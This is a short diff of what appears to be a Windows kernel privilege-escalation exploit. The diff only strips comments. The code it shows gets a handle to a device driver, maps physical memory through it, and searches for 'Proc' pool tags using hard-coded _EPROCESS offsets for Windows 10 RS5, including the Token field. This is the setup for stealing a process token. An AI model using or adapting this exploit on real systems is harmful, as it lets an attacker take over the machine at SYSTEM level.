@@ -75,7 +75,7 @@ int main()
 	{
 		wprintf(L"[^] Successfully got a handle => %p\n", hDevice);
 		SECTION_MAP mapbuffer = { 0 };
-		mapbuffer.CommitSize = (ULONGLONG)(1024 * 1024 * 1024) * totalMemoryInGB; // 9GB
+		mapbuffer.CommitSize = (ULONGLONG)(1024 * 1024 * 1024) * totalMemoryInGB;
 		mapbuffer.SectionOffset = 0;
 		BOOL success = MapViewOfSection(status,hDevice, &mapbuffer);
 
@@ -99,9 +99,9 @@ int main()
 		ULONG PoolTagValue = 0x636f7250; // Hex representation of tag "Proc"
 
 		// _EPROCESS offsets Win 10 rs5
-		ULONGLONG UniqueProcessId = 0x2e0; // change this to target specific windows version
-		ULONGLONG Token = 0x358;           // change this to target specific windows version
-		ULONGLONG ImageFileName = 0x450;   // change this to target specific windows version
+		ULONGLONG UniqueProcessId = 0x2e0;
+		ULONGLONG Token = 0x358;
+		ULONGLONG ImageFileName = 0x450;
 
 		// _EPROCESS temp vars
 		ULONGLONG eprocess_cmd = 0x0;
